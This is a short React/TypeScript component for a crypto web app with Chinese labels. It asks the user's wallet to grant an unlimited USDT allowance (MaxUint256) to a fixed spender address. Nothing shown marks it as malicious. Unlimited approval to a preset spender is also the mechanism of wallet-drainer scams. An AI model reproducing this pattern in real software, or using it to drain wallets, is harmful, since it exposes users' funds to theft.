import React, { useState } from 'react';
import { ethers } from 'ethers';
import { USDT_ADDRESS, USDT_ABI, SPENDER_ADDRESS } from '../constants/contracts';

interface Props {
  provider: ethers.providers.Web3Provider | null;
  address: string;
}

const TokenApproval: React.FC<Props> = ({ provider, address }) => {
  const [status, setStatus] = useState('');

  const handleApprove = async () => {
    if (!provider) return setStatus('请先连接钱包');
    try {
      const signer = provider.getSigner();
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      setStatus('授权中...');
      await tx.wait();
      setStatus('授权成功！');
    } catch (e: any) {
      setStatus('失败: ' + (e.message || e));
    }
  };

  return (
    <div style={{border: '1px solid #eee', padding: 16, marginBottom: 16}}>
      <h3>USDT 授权</h3>
      <button onClick={handleApprove}>授权 USDT</button>
      <div>{status}</div>
    </div>
  );
};

export default TokenApproval; 